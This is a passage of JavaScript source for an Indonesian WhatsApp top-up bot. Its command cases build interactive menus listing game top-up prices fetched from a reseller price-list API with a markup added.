                  `❌ *pricelistpln*: Tarif listrik yang kompetitif.\n` +
                  `*pricelistpulsa*: Pulsa dengan harga bersaing.\n` +
                  `\n📊 *Paket Kuota:*\n` +
                  `*pricelistkuota*: Berbagai pilihan paket internet.\n\ncontoh *.priclistgame* untuk melihat`);
hanz.editmsg(m.chat,daftarNya,m)
 // reply(daftarNya);
}
break;

case 'pricelistgame':{
if (isGroup) return onlyPrivate()
 let messageContent = `*${ucapanWaktu} ${pushname}*\n\nList Layanan Produk Topup Yang Tersedia:`;

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: messageContent,
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botName
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "single_select",
                                "buttonParamsJson": JSON.stringify({
                                    title: "Pilih Di Sini",
                                    sections: [
                                        {
                                            title: "Topup Game",
                                            rows: [
                                                { header: "Free Fire", title: "Free Fire", description: "List harga Topup Free Fire Murah", id: "ff" },
                                                { header: "PUBG Mobile", title: "PUBG Mobile", description: "List harga Topup PUBG Mobile Murah", id: ".pubg" },
                                                { header: "PUBG New State Mobile", title: "PUBG New State Mobile", description: "List harga Topup PUBG New State Mobile Murah", id: ".pubg1" },
                                                { header: "Mobile Legends", title: "Mobile Legends", description: "List harga Topup Mobile Legends Murah", id: "ml" },
                                                { header: "Call of Duty Mobile", title: "Call of Duty Mobile", description: "List harga Topup Call of Duty Mobile Murah", id: ".cod" },
                                                { header: "Genshin Impact", title: "Genshin Impact", description: "List harga Topup Genshin Impact Murah", id: ".genshin" },
                                                { header: "Stumble Guys", title: "Stumble Guys", description: "List harga Topup Stumble Guys Murah", id: ".stumble" },
                                                { header: "Point Blank", title: "Point Blank", description: "List harga Topup Point Blank Murah", id: ".pb" },
                                                { header: "Growtopia", title: "Growtopia", description: "List harga Topup Growtopia Murah", id: ".growtopia" },
                                                { header: "Garena", title: "Garena", description: "List harga Topup Garena Murah", id: ".garena" },
                                                { header: "Arena of Valor", title: "Arena of Valor", description: "List harga Topup Arena of Valor Murah", id: ".aov" },
                                                { header: "Super Sus", title: "Super Sus", description: "List harga Topup Super Sus Murah", id: ".sps" },
                                                { header: "Lita", title: "Lita", description: "List harga Topup Lita Murah", id: ".lita" },
                                                { header: "Hago", title: "Hago", description: "List harga Topup Hago Murah", id: ".hago" },
                                                { header: "Lokapala", title: "Lokapala", description: "List harga Topup Lokapala Murah", id: ".lokapala" },
                                                { header: "8 Ball Pool", title: "8 Ball Pool", description: "List harga Topup 8 Ball Pool Murah", id: ".8ballpool" },
                                                { header: "Zepeto", title: "Zepeto", description: "List harga Topup Zepeto Murah", id: ".zepeto" },
                                                { header: "Sausage Man", title: "Sausage Man", description: "List harga Topup Sausage Man Murah", id: ".sausageman" },
                                                { header: "Clash of Clans", title: "Clash of Clans", description: "List harga Topup Clash of Clans Murah", id: ".coc" },
                                                { header: "Honor of Kings", title: "Honor of Kings", description: "List harga Topup Honor of Kings Murah", id: ".hok" }
                                            ]
                                        }
                                    ]
                                })
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid,
                            newsletterName,
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: m });

   hanz.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    }); 
                   
    }
        break

case 'ml': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP MOBILE LEGENDS*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "MOBILE LEGENDS" && i.category !== "Membership") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup Mobile Legends",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage1 = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Diamond Mobile Legends",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg1 = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage1.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Mobile Legends",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg1.key.remoteJid, msg1.message, {
                messageId: msg1.key.id
            });
        }
    })
}
break
case 'hok': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP HONOR OF KINGS*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "Honor of Kings") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup Honor of Kings",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    })
}
break

case 'pubg': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP PUBG*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "PUBG MOBILE" && i.category !== "Voucher") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup PUBG Mobile",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    })
}
break
case 'pubg1': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP PUBG NEW STATE MOBILE*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "PUBG New State Mobile") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup PUBG New State",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

          hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    })
}
break

case 'ff': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP FREE FIRE*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "FREE FIRE") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup Free Fire",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

           hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    })
}
break

case 'coc': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP CLASH OF CLANS*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "Clash of Clans") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup Clash of Clans",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    })
}
break

case 'garena': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP GARENA*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "GARENA") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup Garena",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    })
}
break
case 'sausageman': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP SAUSAGE MAN*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "Sausage Man") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup Sausage Man",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break

                                            
case '8ballpool': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP 8 BALL POOL*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "8 Ball Pool") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup 8 Ball Pool",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break
  case 'zepeto': {
 if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP ZEPETO*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "Zepeto") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup Zepeto",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break

case 'lokapala': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP LOKAPALA*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "Lokapala") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup Lokapala",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break
case 'lita': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP HONKAI IMPACT 3*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "Lita") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup Lita",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
